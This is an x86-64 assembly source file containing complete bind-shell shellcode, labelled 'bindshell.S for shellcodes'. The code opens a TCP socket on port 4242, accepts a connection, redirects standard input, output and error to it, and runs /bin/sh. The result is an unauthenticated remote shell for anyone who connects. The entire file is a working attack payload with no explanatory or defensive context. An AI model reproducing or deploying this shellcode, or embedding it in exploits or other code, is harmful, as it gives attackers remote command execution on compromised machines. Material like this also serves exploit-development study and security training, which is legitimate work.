;;
;; bindshell.S for shellcodes
;; by lenormf
;;

bits 64

global _start

section .text

_start:
	;; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
	mov rdi, 2
	mov rsi, 1
	xor rdx, rdx
	mov rax, 41
	syscall

	;; bind(socket, {AF_INET, htons(4242), 0, 0}, 16)
	mov rdi, rax
	push QWORD 0
	push DWORD 0
	push WORD 0x9210
	push WORD 2
	mov rsi, rsp
	mov rdx, 16
	mov rax, 49
	syscall

	;; clean out the stack
	pop rax
	pop rax
	pop rax

	;; listen(socket, 5)
	mov rsi, 5
	mov rax, 50
	syscall

	;; accept(socket, 0, 0)
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 43
	syscall

	mov rdi, rax

	;; dup2(socket, 0)
	xor rsi, rsi
	mov rax, 33
	syscall

	;; dup2(socket, 1)
	inc rax
	mov rsi, rax
	mov rax, 33
	syscall

	;; dup2(socket, 2)
	inc rax
	mov rsi, rax
	mov rax, 33
	syscall

	;; execve("/bin//sh", 0, 0)
	mov rax, 0x68732f2f6e69622f
	push rax
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 59
	syscall
